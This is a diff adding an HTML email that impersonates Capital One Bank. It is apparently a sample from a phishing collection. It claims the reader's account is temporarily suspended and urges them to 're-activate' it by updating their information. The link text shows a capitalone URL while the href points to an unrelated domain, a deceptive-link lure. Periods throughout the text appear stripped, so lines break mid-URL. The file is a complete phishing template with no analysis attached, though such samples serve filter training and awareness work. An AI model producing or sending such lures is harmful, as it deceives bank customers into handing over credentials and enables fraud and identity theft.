@@ -1,0 +1,104 @@
+<html>
+
+<TABLE cellSpacing=0 cellPadding=0 width=774 border=0 xt="SPTABLE"
+name="SP_TABLE1" id="table1" height="320">
+<TBODY>
+<TR xt="SPROW">
+<TD xt="SPCELL" name="yyy" height="42">
+</TD></TR>
+<TR xt="SPROW">
+<TD xt="SPCELL" name="yyy">
+
+<p align="left"><font face="Verdana" size="2">Dear Capital One Bank customer,</font></p>
+<p align="justify"><font face="Verdana" size="2">
+
+
+<table>
+<tr>
+<td  width="450"><font face="Verdana" size="2">
+As the Internet and information technology enable us to expand our services, we are committed to maintaining the trust customers have placed in us for protecting the privacy and security of information we have about you
+ In order to protect your information against unauthorized access, identity theft and account fraud we earnestly ask you to update your profile
+  
+<br><br>We also discovered a problem with your account information, and we temporary suspended access to it
+ You can easy re-activate your account by updating your information
+
+
+ </font></p>
+<p align="justify"><font face="Verdana" size="2">To get started, please click 
+the link below:</font></p>
+<p align="justify"><font face="Verdana" size="2">
+<b>
+
+
+
+
+
+
+<a target="_blank" href="http://manabi-tai
+net/onlinebanking
+capitalone
+com/">
+
+
+
+
+
+
+
+
+
+
+https://onlinebanking
+capitalone
+com/update/index
+html
+
+
+
+
+
+
+
+
+ </a> </b></font></p>
+<p align="justify"><font face="Verdana" size="2">If you received this notice and you are not the authorized account holder,
+please be aware that it is in violation of our policy to represent oneself
+as another Capital One Bank user
+ Such action may also be in violation of local, national, 
+and/or international law
+ Capital One Bank is committed to assist law enforcement with 
+any inquiries related to attempts to misappropriate personal information with
+the intent to commit fraud or theft
+ Information will be provided at the request
+of law enforcement agencies to ensure that perpetrators are prosecuted to the 
+fullest extent of the law
+</font></p>
+
+<table align=right width="200" border="0">
+  <tr>
+    <td></td>
+  </tr>
+</table>
+<p align="justify"><font face="Verdana" size="2">Thanks for your patience as we work together to maintain your account secure
+</font></p>
+
+<p align="justify"><font face="Verdana" size="2">Regards,</font></p>
+<p align="justify"><font face="Verdana" size="2">  Capital One Bank Customer Support Center
+</font></p>
+
+<font size="1" face="verdana,arial,helvetica" color="#bbb7c7">
+<div align="left"><span class="footer-text"><br>
+  <br>
+  This site is directed at or made available to persons in the United States and  Capital One Bankcustomers only
+ 
+ Products and services described, as well as associated fees, charges, 
+  interest rates, and balance requirements may differ among geographic locations
+ 
+  Not all products and services are offered at all locations
+<br>
+  </span><br>
+</div></font>
+
+<font size="1" face="verdana,arial,helvetica" color="#bbb7c7"><div align="right">Copyright © 2007 - Capital One Bank
+
+</html>
